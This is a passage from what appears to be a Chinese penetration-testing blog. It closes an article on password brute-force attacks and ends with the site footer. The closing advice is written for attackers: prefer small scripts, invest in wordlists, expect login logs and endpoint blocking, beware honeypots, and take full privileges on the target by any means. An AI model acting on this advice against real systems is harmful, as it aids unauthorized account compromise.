+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;不得不说,这类的爆破攻击,势必要在目标的系统里面留下大量的登陆日志,而且得别人让你爆才行,实际测试可知,先不说专业的ids,如果目标部署了mcafee企业套装,只要勾选了”爆破攻击”规则,这些工具基本就废了一大半,但,不一定就不好用,在你山穷水尽,走投无路之时,任何手段都是可以被尝试的,另外,个人还是更推荐用一些单文件[对于一款渗透工具来讲,其依赖自然是越少越好,体积越小越好,对系统影响越轻越好,也许你会发现,各种py工具表面貌似很强大,但仔细深究,基本全都是在用别人的库不停的重复造轮子……嘿嘿,不说了,怕挨打]的小脚本[上面这些工具需要安装的东西确实有点儿多],如果有,拿来改吧改吧用即可,实在没有,想办法自己写也行,尽管这种招数确实很低级,但你可以把它做的不低级 [比如,你可以把大量的功夫下在字典上],而且很高效,成败归根结底在人,如果你手里实在没有像样的0day,那就别硬装那个逼,虚心慢慢搞就是了,反正我们的最终目标是拿到目标系统的最高权限,至于中间用什么手段没人会在意,说的天花乱坠,但最终还是没有搞进去,等于说了一堆废话,务必时刻清楚,我们不是在做学术讨论,任何攻击研究,如果没法很好的用于实战,都是空架子,但当你真正搞进去了,哪怕你是用自己猜密码绝技进去的,你一样可以把它说的非常高深,这就是现实,没办法,有时候百分之九十九等于0,有时候百分之一等于100,在你没搞到完整权限之前,多做少说,方成大器,最后关于如何做字典的注意事项[程序算法始终有限],会在后续的相关文章中,仔细说明,比较多,话说回来,可能百分之九十九的人,都会觉得爆破是很low的,嘿嘿……其实,我想说,如果你前期的信息搜集非常到位,爆破往往是最快,最直接,也是最致命的,顺便提醒大家一下,<code>小心蜜罐</code></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/brute-force/">#brute force</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
